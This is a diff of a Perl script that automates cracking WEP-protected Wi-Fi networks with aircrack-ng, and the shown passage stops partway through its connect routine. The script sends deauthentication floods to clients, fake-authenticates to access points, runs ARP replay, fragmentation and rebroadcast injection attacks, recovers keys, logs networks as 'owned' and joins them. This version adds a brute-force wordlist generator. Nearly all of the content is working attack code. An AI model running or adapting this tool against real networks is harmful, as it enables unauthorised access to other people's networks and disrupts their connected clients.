@@ -3,7 +3,12 @@ use warnings;
 use strict;
 use Term::ReadKey;
 use Expect;
-use subs qw(connect pingtest select_iface);
+use Getopt::Long;
+use File::Slurp;
+use Number::Range;
+use Algorithm::Permute;
+use Pod::Usage;
+use subs qw(connect pingtest select_iface wordlistgen);
 
 
 ################################################  COPYRIGHT  AND  DISCLAMER   ###########################################################
@@ -33,6 +38,18 @@ use subs qw(connect pingtest select_iface);
 # Set 1 to enable debugging: 
 my $debug = 0;
 
+###################  DEFAULT NON-OVERLAPPING CHANNELS SELECTION  #######################
+
+my $country = 'US';
+
+# US = 1, 6, 11
+# EU = 1, 5, 9, 13
+# all = 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14
+
+my %default_channels;
+$default_channels{'US'} = { 1=> '', 6=> '', 11=>'' };
+$default_channels{'EU'} = { 1=>'', 5=>'', 9=>'', 13=>'' };
+$default_channels{'all'} = { 1=>'', 2=>'', 3=>'', 4=>'', 5=>'', 6=>'', 7=>'', 8=>'', 9=>'', 10=>'', 11=>'', 12=>'', 13=>'', 14=>'' };
 
 
 ##########   INTERFACE CONFIGURATION   ##################
@@ -67,8 +84,8 @@ my $packets_to_try = 6;
 # After 40 seconds, stop fragmentation, try rebroadcast -p 0841
 my $frag_timeout = 40;
 
-# After 20 minutes worth of sleeps, if we are still injecting, don't wait forever, stop and move to the next AP ($ivtimer / 10)
-my $ap_timeout = 120;
+# After 30 minutes worth of sleeps, if we are still injecting, don't wait forever, stop and move to the next AP ($ivtimer / 10)
+my $ap_timeout = 180;
 
 # After 15 minutes of cracking and still couldn't find the key, don't wait forever, move to the next AP
 my $crack_timeout = 900;
@@ -86,44 +103,247 @@ my $select_timeout = 3;
 my $pingcount = 10;
 
 
-###################  DEFAULT NON-OVERLAPPING CHANNELS SELECTION  #######################
-
-my $country = 'US';
-
-# US = 1, 6, 11
-# EU = 1, 5, 9, 13
-
-my %default_channels;
-$default_channels{'US'} = { 1=> '', 6=> '', 11=>'' };
-$default_channels{'EU'} = { 1=>'', 5=>'', 9=>'', 13=>'' };
-
-
-#########################################################################################
 
 
 
 
-my $mode;
-my $pinghost;
-my %uniq_channels;
-my %all_ap;
-my %owned_ap;
-my %known_ap;
-my %bad_ap;
-our $gateway;
-my $bssid; 
-my $ssid; 
-my $key; 
-my $selected_iface;
-our $set_monitor_error;
-our $old_ivcount = 0;
+
+
+our ($gateway, $set_monitor_error);
 our $hssid = time;
+our $old_ivcount = 0;
+
+my ($mode, $pinghost, %uniq_channels, %all_ap, %owned_ap, %known_ap, %bad_ap, 
+    $bssid, $ssid, $key, $selected_iface, @nokeys, @ownedrecently, @badskipped,
+    @knownskipped, $manualip); 
+
 my $apcount = 0;
-my @nokeys;
-my @ownedrecently;
-my @badskipped;
-my @knownskipped;
-my $manualip;
+my $man = 0;
+my $help = 0;
+my (@set, %filters, %merge, @charset, $uniq, $fastpermute);
+my $alphanumeric = Number::Range->new("48..57,65..90,97..122");
+my $vowels = Number::Range->new("97,101,105,111,117,65,69,73,79,85");
+my $pwlen = 0;
+my $word = '';
+
+
+#######################   BEGIN ARGUMENT VERIFICATION #########################
+
+
+if (scalar @ARGV > 0 ){
+  if ($ARGV[0] !~ /^\d/){
+      if ($ARGV[0] eq 'sort' or $ARGV[0] eq 'connect'){
+	$mode = shift @ARGV;
+
+      } elsif ($ARGV[0] eq 'permute'){
+
+######################   BEGIN WORDLIST GENERATOR  ############################
+
+
+### Get all the command line options.
+
+GetOptions ( 
+	     "length=s{1,}" => \$pwlen,
+             "charset=s{,}" => \@charset,
+ 	     "uniq" => \$uniq, 
+	     "filter:s{,}" => \%filters,
+	     "merge=s{2,}" => \%merge,
+             "help|?" => \$help, man => \$man) or pod2usage(1); 
+
+pod2usage(1) if $help;
+pod2usage(-exitstatus => 0, -verbose=> 2) if $man;
+
+
+
+
+### Expand the character set ranges
+
+@charset = split(/,/,join('',@charset));
+
+foreach (@charset){
+ if (/-|\.\./){
+   (my $start) = $_ =~ /(\w+)\W+/;
+   (my $end) = $_ =~ /\W+(\w+)/;
+    $_ = join('', ($start..$end));
+ }
+}
+
+
+### Process the pre-defined character sets
+
+
+foreach (@charset){
+if ($_ eq 'lower'){
+   for (97..122) {
+	push @set, chr($_);
+   }
+
+}elsif ($_ eq 'upper'){
+   for (65..90){
+	push @set, chr($_);
+   }
+
+} elsif ($_ eq 'number'){
+   for (48..57) {
+	push @set, chr($_);
+   }
+}elsif ($_ eq 'symbol'){
+   for (33..126){
+	push @set, chr($_) unless $alphanumeric->inrange($_);
+   }
+
+}elsif ($_ eq 'nonsymbol'){
+   for (33..126){
+	push @set, chr($_) if $alphanumeric->inrange($_);
+   }
+
+}elsif ($_ eq 'all'){
+   for (33..126){
+	push @set, chr($_);
+   }
+}
+else{
+
+   if (-e $_){
+    open CHARSET, $_ or die $!;
+    while (<CHARSET>){
+      chomp;
+      for my $onfilechar (split(//,$_)){
+          push @set, $onfilechar;
+      }
+    }
+   }else{
+     for my $char(split(//,$_)){
+ 	push @set, $char;
+     }
+   }
+ }
+
+}
+
+
+
+### Remove duplicate characters in the set
+
+my %tempset;
+
+foreach (@set){
+  $tempset{$_} = undef;
+}
+
+undef (@set);
+
+foreach (keys %tempset){
+push @set, $_;
+}
+
+undef (%tempset);
+
+########################
+
+
+### Set the length to number of characters if it's not given.
+
+$pwlen =~ s/-/../g;
+if ($pwlen == 0){
+ $pwlen = @set;
+ $fastpermute = 1;
+}
+
+$pwlen = Number::Range->new($pwlen);
+
+
+### Finally, start generating the word list
+
+wordlistgen;
+
+
+######################   END WORDLIST GENERATOR  ############################
+
+
+	 }else{
+           pod2usage(1) if $ARGV[0] eq '--help';
+           pod2usage(-exitstatus => 0, -verbose=> 2) if $ARGV[0] eq '--man';
+	}
+	
+  }else{
+
+## We use hash to store channel arguments (as hash keys) so that we won't have to scan a channel more than once in case of duplicate channel inputs
+    foreach (@ARGV){
+	if ($_=~/^\d/){
+	    $_ =~ tr/0-9//cd;
+            if ($country eq 'US'){
+		if (exists $default_channels{$country}{$_}){
+		      $uniq_channels{$_} = '';
+	         }else{
+			print "<< DEBUG >>: $_ IS NOT A $country CHANNEL. EXCLUDING...\n" if $debug;
+		  }
+            }elsif ($country eq 'EU'){
+		if (exists $default_channels{$country}{$_}){
+		      $uniq_channels{$_} = '';
+		  }else{
+			print "<< DEBUG >>: $_ IS NOT AN $country CHANNEL. EXCLUDING...\n" if $debug;
+		  }
+
+            }elsif ($country eq 'all'){
+		if (exists $default_channels{$country}{$_}){
+		     $uniq_channels{$_} = '';
+	         }else{
+			
+			print "<< DEBUG >>: CHANNEL $_ DOES NOT EXIST. EXCLUDING...\n" if $debug;
+		  }
+	     }
+
+	  }
+      }
+  }
+	
+}
+  
+
+
+
+
+####  If there was no channel passed (MODE: crack only), defaults to all non overlapping channels on the country specified
+    if (scalar keys %uniq_channels == 0){
+	if (!defined $mode){
+	  print	"No valid channel entered. Using the default ( $country channels = ";
+	}else{
+   	  print "Looking for access points within the range ( $country channels = ";		
+	}
+	while (( my $key, my $val) = each %{$default_channels{$country}}){
+		$uniq_channels{$key} = $val;
+	}
+	if ($country eq 'US' || $country eq 'EU'){
+	  foreach (sort { $a <=> $b } keys %uniq_channels){
+	     print "$_ ";
+	  }
+	}else{
+	     print "1-14 ";	
+	 }
+	print ")\n\n";
+     }
+    
+
+
+	if (defined $mode){
+	$pinghost = shift @ARGV;
+	$pinghost = 'gateway' unless defined $pinghost;
+	if ($mode ne 'sort'){
+	   if ($mode ne 'connect'){
+		print "\nUsage: \n";
+		print "\tperl $0 [channel/s] (or any combination, space separated )\n"; 
+		print "\tperl $0 (sort | connect) [HOST | IP] 		(Defaults to: gateway)\n";
+		exit;
+	   }
+	 }
+	}else{
+        print "\nUnknown Option: \"$ARGV[0]\". Using the default. (use --help for more details).\n\n" if (scalar @ARGV > 0 && $ARGV[0] !~ /^\d/);
+	  $mode = 'crack';
+	}
+
+
+#################   END ARGUMENT VERIFICATION ####################################
 
 ###########################   BEGIN DETECT WIRELESS INTERFACE   ###############################################
 
@@ -230,88 +450,6 @@ unless (defined $macaddress && $macaddress ne ''){
 
 
 ###########################   END DETECT WIRELESS INTERFACE   ###############################################
-
-
-#######################   BEGIN ARGUMENT VERIFICATION #########################
-# We only accept either 'sort', 'connect' (sort and connect can be followed by optional IP or hostname)
-# or just any combination of 1, 6, and 11 for US and 1, 5, 9, 13 for EU non-overlapping channels
-
-
-if (scalar @ARGV > 0 ){
-  if ($ARGV[0] !~ /^\d/){
-      if ($ARGV[0] eq 'sort' or $ARGV[0] eq 'connect'){
-	$mode = shift @ARGV;
-      }
-  }else{
-
-## We use hash to store channel arguments (as hash keys) so that we won't have to scan a channel more than once in case of duplicate channel inputs
-    foreach (@ARGV){
-	if ($_=~/^\d/){
-	    $_ =~ tr/0-9//cd;
-            if ($country eq 'US'){
-		if (exists $default_channels{$country}{$_}){
-		      $uniq_channels{$_} = '';
-	         }else{
-			print "<< DEBUG >>: $_ IS NOT A $country CHANNEL. EXCLUDING...\n" if $debug;
-		  }
-            }elsif ($country eq 'EU'){
-		if (exists $default_channels{$country}{$_}){
-		      $uniq_channels{$_} = '';
-		  }else{
-			print "<< DEBUG >>: $_ IS NOT AN $country CHANNEL. EXCLUDING...\n" if $debug;
-		  }
-		  
-
-
-            }
-
-	  }
-      }
-  }
-	
-}
-  
-
-
-
-
-####  If there was no channel passed (MODE: crack only), defaults to all non overlapping channels on the country specified
-    if (scalar keys %uniq_channels == 0){
-	if (!defined $mode){
-	  print	"No valid channel entered. Using the default ( $country = ";
-	}else{
-   	  print "Looking for access points within the range ( $country = ";		
-	}
-	while (( my $key, my $val) = each %{$default_channels{$country}}){
-		$uniq_channels{$key} = $val;
-	}
-	foreach (sort { $a <=> $b } keys %uniq_channels){
-	  print "$_ ";
-	}
-	print ")\n\n";
-     }
-    
-
-
-	if (defined $mode){
-	$pinghost = shift @ARGV;
-	$pinghost = 'gateway' unless defined $pinghost;
-	if ($mode ne 'sort'){
-	   if ($mode ne 'connect'){
-		print "\nUsage: \n";
-		print "\tperl $0 [channel/s] (or any combination, space separated )\n"; 
-		print "\tperl $0 (sort | connect) [HOST | IP] 		(Defaults to: gateway)\n";
-		exit;
-	   }
-	 }
-	}else{
-        print "\nUnknown Mode: \"$ARGV[0]\". Using the default (crack)\n\n" if (scalar @ARGV > 0 && $ARGV[0] !~ /^\d/);
-	  $mode = 'crack';
-	}
-
-
-#################   END ARGUMENT VERIFICATION ####################################
-
 
 	print "\nMODE: $mode\t(using: $inject_iface/$monitor_iface == $macaddress)\n";
 
@@ -470,11 +608,12 @@ print "<< DEBUG >>: RUNNING \"rm chan* inject* replay* deauth* fragment* forged*
 	### Existing keys can be replaced if 15 days have passed since the date the key was cracked.
 	### If ran in less than 15 days, existing entries will be skipped
 
-	if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} && (time  - $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) < 1296000) {
+	#if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} && (time  - $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) < 1296000) {
+	if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} ) {
 	   print "########################################################\n\n" if $debug;
 	   print "<< DEBUG >>: $all_ap{$all_ap_key}->{'bssid'} OWNED JUST RECENTLY \(", scalar localtime($owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}),"\).\nSKIPPING...\n\n" if $debug;
 	   print "########################################################\n" if $debug;
-	   push @ownedrecently, "$all_ap{$all_ap_key}->{'bssid'}  \"$all_ap{$all_ap_key}->{'ssid'}\"  (" . scalar localtime($owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) . ")"; 
+	   push @ownedrecently, "$all_ap{$all_ap_key}->{'bssid'}  \"$owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'ssid'}\"  (" . scalar localtime($owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) . ")"; 
 	   next;
 	 }
 
@@ -494,7 +633,7 @@ print "<< DEBUG >>: RUNNING \"rm chan* inject* replay* deauth* fragment* forged*
 	      print "<< DEBUG >>: CHILD PROCESS PID IS $deauthdump_pid...\n" if $debug; 
 
 	      if ($deauthdump_pid == 0){
-	         print "<< DEBUG >>: RUNNING \"airodump -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} --output-format csv -w deauth_dump 2\>\&1\"...\n" if $debug;
+	         print "<< DEBUG >>: RUNNING \"airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} --output-format csv -w deauth_dump 2\>\&1\"...\n" if $debug;
 	        `airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} --output-format csv -w deauth_dump 2>&1`;
 	      }
 
@@ -523,7 +662,7 @@ print "<< DEBUG >>: RUNNING \"rm chan* inject* replay* deauth* fragment* forged*
 			print "Sending directed Deauth...\n";
 			for (@{$all_ap{$all_ap_key}->{'clients'}}){	
 			  print "Sending Deauth to $_...\n";
-			  print "<< DEBUG >>: RUNNING \"aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress -c $_ 2\>\&1\"...\n" if $debug;
+			  print "<< DEBUG >>: RUNNING \"aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress -c $_ 2\>\&1\"...\n" if $debug;
 		          `aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress -c $_ 2>&1`;
 
 			}
@@ -645,7 +784,7 @@ print "\n<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG TO BE READ F
 die "Could not fork aireplay-ng!: $!\n\n"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
 print "<< DEBUG >>: CHILD PROCESS PID IS $preauth_pid...\n" if $debug; 
 print "<< DEBUG >>: DOING ONE TIME FAKE AUTHENTICATION...\n" if $debug;
-print "<< DEBUG >>: RUNNING \"aireplay -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\|\"...\n" if $debug;
+print "<< DEBUG >>: RUNNING \"aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\|\"...\n" if $debug;
 
 if ($preauth_pid == 0){
   open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2>&1|" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
@@ -712,12 +851,12 @@ while (<PREAUTH_IPC>){
       if (/No such BSSID/){
 	 print "$_\n\n";
 	 print "Try running this command manually:\n\n";
-	 print "\"aireplay -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\"\n\n";
+	 print "\"aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\"\n\n";
       }else{
 	 print "$_\n";
 	 print "Too many to mention. =)\n";
 	 print "Try running this command manually:\n\n";
-	 print "\"aireplay -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\"\n\n";
+	 print "\"aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2\>\&1\"\n\n";
       }	 
       $auth = 'failed';
       print "<< DEBUG >>: KILLING AIREPLAY-NG CHILD PROCESS (PID: $preauth_pid)...\n" if $debug;
@@ -795,13 +934,13 @@ if (defined $errline){
 	   print "<< DEBUG >>: CHILD PROCESS PID IS $pid...\n" if $debug; 
 	   if ($pid == 0){
 
-	      print "<< DEBUG >>: RUNNING \"aireplay -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress \|\"...\n"	if $debug;
+	      print "<< DEBUG >>: RUNNING \"aireplay-ng -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress \|\"...\n"	if $debug;
 	      open AIREPLAY, "aireplay-ng -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress |" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 	      my @fakeauth;
 	      print "<< DEBUG >>: NOW READING THE OUTPUT OF AIREPLAY-NG...\n" if $debug;
 	      while (<AIREPLAY>){
-	      next if /^\s+$/;
-	      push @fakeauth, $_; 
+	       next if /^\s+$/;
+	       push @fakeauth, $_; 
 	       if (/Association successful/){
                   print "<< DEBUG >>: FOUND \/Association successful\/ IN aireplay-ng OUTPUT...\n" if $debug;
 		  if (defined $errline or defined $skaauth){
@@ -820,7 +959,7 @@ if (defined $errline){
 		  if ($airodump_pid == 0){
 		      print "<< DEBUG >>: DELETING inject_dump* BEFORE WE START...\n" if $debug;	
 		      `rm inject_dump* 2>&1`;
-	              print "<< DEBUG >>: RUNNING \"airodump $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} --output-format pcap,csv -w inject_dump 2\>\&1\"...\n" if $debug;
+	              print "<< DEBUG >>: RUNNING \"airodump-ng $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} --output-format pcap,csv -w inject_dump 2\>\&1\"...\n" if $debug;
 		     `airodump-ng $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} --output-format pcap,csv -w inject_dump  2>&1`;
 		  }
 		  ###################    END AIRODUMP FORK    ################################
@@ -828,7 +967,7 @@ if (defined $errline){
 		### Try deauth first before injecting... 
 
 		print "Sending Deauth...\n";
-	        print "<< DEBUG >>: RUNNING \"aireplay -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
+	        print "<< DEBUG >>: RUNNING \"aireplay-ng -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
 		`aireplay-ng -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
 
 		  ##################    BEGIN ARP REPLAY FORK   #############################
@@ -836,7 +975,7 @@ if (defined $errline){
 		  die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $aireplay_pid = fork);
 	          print "<< DEBUG >>: CHILD PROCESS PID IS $aireplay_pid...\n" if $debug; 
 		  if ($aireplay_pid == 0){
-	              print "<< DEBUG >>: RUNNING \"aireplay $inject_iface -3 -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2\>\&1\"...\n" if $debug;
+	              print "<< DEBUG >>: RUNNING \"aireplay-ng $inject_iface -3 -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2\>\&1\"...\n" if $debug;
 		     `aireplay-ng $inject_iface -3  -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1`;
 		  }
 		  ##################    END ARP REPLAY FORK    ##############################
@@ -848,7 +987,7 @@ if (defined $errline){
 	###   If IV doesn't reach 100 within 10 seconds, try deauth (for windows clients which refreshes arp cache on disconnects)
 	###   If IV doesn't reach 300 within 40 seconds, try clientless attacks (fragmentation, -p0841)
 	###   If IV is still 0 within 40 seconds, stop injecting and move to the next AP
-	###   If 30 minutes have passed, stop injecting and move to the next AP 
+	###   If 20 minutes have passed, stop injecting and move to the next AP 
 	###   If Enter key is pressed, stop injecting and move to the next AP
 
 
@@ -930,7 +1069,7 @@ if (defined $errline){
 	       if ($aircrack_pid == 0){
 
 
-	         print "<< DEBUG >>: RUNNING \"aircrack -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap \|\"...\n" if $debug;
+	         print "<< DEBUG >>: RUNNING \"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap \|\"...\n" if $debug;
 	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die "Can't run aircrack-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 		 while (<AIRCRACK>){
 			chomp;
@@ -1042,12 +1181,12 @@ if ($ivtimer % 5 == 0 || $ivtimer == 1){
 
 	      if ($ivtimer / 10 == $try_deauth && $all_ap{$all_ap_key}->{'iv'} < 100){
 		print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSending Deauth...\n";
-		print "<< DEBUG >>: RUNNING \"aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
+		print "<< DEBUG >>: RUNNING \"aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
 		`aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
 		print "<< DEBUG >>: SLEEPING FOR 2 SECONDS...\n" if $debug;
 		sleep 2;
 		print "Sending Deauth...\n";
-		print "<< DEBUG >>: RUNNING \"aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
+		print "<< DEBUG >>: RUNNING \"aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
 		`aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
 		print "Counting IVs...\n"; 
 		print "<< DEBUG >>: SLEEPING FOR 2 SECONDS...\n" if $debug;
@@ -1078,7 +1217,7 @@ my $fragmentation = '';
 		    die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $fragment_pid = open(FRAGMENT_IPC, "-|"));
 
 	            print "<< DEBUG >>: COPYING inject_dump-01.cap to inject_dump-01.cap.tmp...\n" if $debug;
-		    print "<< DEBUG >>: RUNNING \"aireplay -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap.tmp -h $macaddress\"...\n" if $debug; 
+		    print "<< DEBUG >>: RUNNING \"aireplay-ng -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap.tmp -h $macaddress\"...\n" if $debug; 
 
 		    if ($fragment_pid == 0){
 
@@ -1086,6 +1225,7 @@ my $fragmentation = '';
 		         my $fragattack = Expect->spawn("aireplay-ng -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap -h $macaddress");
 		         $fragattack->log_stdout(1) if $debug;
 		         $fragattack->log_file("fragattack.log", "w");
+			 #$fragattack->exp_internal(1);
 
 ### Let's try as much data packets as we can within $frag_timeout. The attack ends once we ran out of $packets_to_try or when we got the keystream. 
 		         for (my $triedpackets = 0; $packets_to_try != 0; $packets_to_try--, $triedpackets++){
@@ -1137,7 +1277,7 @@ print "<< DEBUG >>: SETTING $frag_timeout SECONDS TIMEOUT FOR FRAGMENTATION...\n
                         print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR ARP REPLAY ATTACK USING THE FORGED ARP PACKET forged_arp...\n" if $debug;
 		    	die "Could not fork aireplay-ng for \"forged_arp\"!: $!\n\n" unless defined (my $forged_arpreplay_pid = fork);
 		    	if ($forged_arpreplay_pid == 0){
-		       	   print "<< DEBUG >>: RUNNING \"aireplay $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1\"...\n" if $debug;
+		       	   print "<< DEBUG >>: RUNNING \"aireplay-ng $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1\"...\n" if $debug;
 		       	   `aireplay-ng $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1`;
 		        }
 			print "<< DEBUG >>: SLEEPING FOR 3 SECONDS...\n" if $debug;
@@ -1167,7 +1307,7 @@ print "<< DEBUG >>: SETTING $frag_timeout SECONDS TIMEOUT FOR FRAGMENTATION...\n
                      print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR REBROADCAST ATTACK (-p 0841)...\n" if $debug;
 		     die "Could not fork aireplay-ng!: $!\n\n" unless defined ($aireplay_rebroadcast_pid = fork);
 		     if ($aireplay_rebroadcast_pid == 0){
-		          print "<< DEBUG >>: RUNNING \"aireplay $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap\"...\n" if $debug;
+		          print "<< DEBUG >>: RUNNING \"aireplay-ng $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap\"...\n" if $debug;
 		          my $p0841attack = Expect->spawn("aireplay-ng $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap 2>&1");
 		     	  $p0841attack->log_stdout(0);
 		     	  $p0841attack->log_file("rebroadcast.log", "w");
@@ -1348,7 +1488,7 @@ print "<< DEBUG >>: SETTING $frag_timeout SECONDS TIMEOUT FOR FRAGMENTATION...\n
 
 if (scalar @knownskipped > 0){
    print "--------------------------------------------------------\n";
-   print "\nSkipped APs - known_ap.txt (not included):\n\n";
+   print "\nSkipped Access Points - known_ap.txt (not included):\n\n";
    for (@knownskipped){
 	print "$_ ", ($all_ap{$_}->{'ssid'} eq $hssid)?"(hidden)":"\"$all_ap{$_}->{'ssid'}\"","\n";
    }
@@ -1409,7 +1549,6 @@ while (<OWNED>){
    if (exists $all_ap{$bssid}->{'rtt'}){
 
 # 1. %unsortedap key is each entire owned.txt line. The value is each AP's RTT.
-	#$unsortedap{$_} = $all_ap{$bssid}->{'rtt'};
 	$unsortedap{$_}->{'rtt'} = $all_ap{$bssid}->{'rtt'};
 	$unsortedap{$_}->{'packetloss'} = $all_ap{$bssid}->{'packetloss'};
 
@@ -1439,16 +1578,16 @@ system "touch owned_sorted.txt" unless (-e 'owned_sorted.txt');
 
 open SORTED, ">>owned_sorted.txt" or die "Can't append to owned_sorted.txt!: $!\n\n";
 foreach (@outofrange){
-	print SORTED "$_\n";
+    print SORTED "$_\n";
 }
 
 close SORTED;
 
 unless (scalar @nokeys == 0){
- print "\nThe following APs were not sorted because we don\'t have their keys:\n\n";
- for (@nokeys){
-    print "$_\n";
- }
+    print "\nThe following APs were not sorted because we don\'t have their keys:\n\n";
+    for (@nokeys){
+        print "$_\n";
+    }
 }
 
 # 4. Finally, we have a sorted owned.txt
@@ -1476,51 +1615,51 @@ my $pinghost = shift;
 
 
 if ($op eq 'connect'){
-print "Associating...\n";
-print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface mode managed\"...\n" if $debug;
-`iwconfig $inject_iface mode managed`;
-print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface ap $bssid\"...\n" if $debug;
-`iwconfig $inject_iface ap $bssid`;
-print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface essid \'$ssid\'\"...\n" if $debug;
-`iwconfig $inject_iface essid \'$ssid\'`;
-print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface key $key\"...\n" if $debug;
-`iwconfig $inject_iface key $key`;
+    print "Associating...\n";
+    print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface mode managed\"...\n" if $debug;
+    `iwconfig $inject_iface mode managed`;
+    print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface ap $bssid\"...\n" if $debug;
+    `iwconfig $inject_iface ap $bssid`;
+    print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface essid \'$ssid\'\"...\n" if $debug;
+    `iwconfig $inject_iface essid \'$ssid\'`;
+    print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface key $key\"...\n" if $debug;
+    `iwconfig $inject_iface key $key`;
 
-print "<< DEBUG >>: SLEEPING FOR 15 SECONDS...\n" if $debug;
-sleep 15;
-print "<< DEBUG >>: CHECKING IF WE HAVE SUCCESSFULLY ASSOCIATED...\n" if $debug;
-print "<< DEBUG >>: RUNNING \"iwconfig $inject_iface \|\"...\n" if $debug;
-open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
-while (<IWCONFIG>){
-  if (/linked/){
-	print "<< DEBUG >>: FOUND \/linked\/ IN iwconfig OUTPUT...\n" if $debug;
-	print "Associated successfully...\n";
-	print "Setting (IP : Gateway) manually... (192.168.1.150 : 192.168.1.1)\n";
-	print "<< DEBUG >>: RUNNING \"ifconfig $inject_iface 192.168.1.150 netmask 255.255.255.0 > \/dev\/null 2>\&1\"...\n" if $debug;
-   	`ifconfig $inject_iface 192.168.1.150 netmask 255.255.255.0 > /dev/null 2>&1`;
-	print "<< DEBUG >>: RUNNING \"route delete default > \/dev\/null 2>\&1\"...\n" if $debug;
-   	`route delete default > /dev/null 2>&1`;
